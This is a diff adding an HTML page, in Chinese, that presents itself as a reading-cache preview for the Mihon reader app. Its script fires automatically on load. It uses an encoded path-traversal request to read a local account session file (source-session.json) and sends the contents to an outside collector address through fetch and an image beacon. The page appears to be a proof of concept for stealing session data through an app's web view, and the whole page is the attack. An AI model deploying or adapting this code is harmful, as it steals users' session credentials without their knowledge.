@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 阅读缓存预览</title>
+<style>
+body { font-family: sans-serif; max-width: 720px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+pre { white-space: pre-wrap; word-break: break-word; background: #fff; border: 1px solid #ddd; padding: 12px; }
+button { padding: 10px 14px; }
+</style>
+</head>
+<body>
+<h2>Mihon 阅读缓存预览</h2>
+<p>此页面模拟帮助中心里的离线章节缓存预览。</p>
+
+<div class="card">
+  <button id="run">读取本地阅读资源</button>
+  <pre id="output">等待触发...</pre>
+</div>
+
+<script>
+var collector = "http://" + "198.18.0.1" + ":8000/collect";
+var target = "http://reader-cache.mihon.local/..%2Freader_account/source-session.json";
+
+function log(value) {
+    document.getElementById("output").textContent = value;
+}
+
+function collect(label, data) {
+    var body = label + "=" + encodeURIComponent(data || "");
+    try {
+        fetch(collector + "?d=" + encodeURIComponent(body), { mode: "no-cors" });
+    } catch (e) {}
+    try {
+        new Image().src = collector + "?d=" + encodeURIComponent(body);
+    } catch (e) {}
+}
+
+function run() {
+    log("requesting: " + target);
+    fetch(target)
+        .then(function (response) { return response.text(); })
+        .then(function (text) {
+            log(text);
+            collect("reader_cache_file", text);
+        })
+        .catch(function (error) {
+            log("error: " + error);
+            collect("reader_cache_error", String(error));
+        });
+}
+
+document.getElementById("run").addEventListener("click", run);
+setTimeout(run, 500);
+</script>
+</body>
+</html>
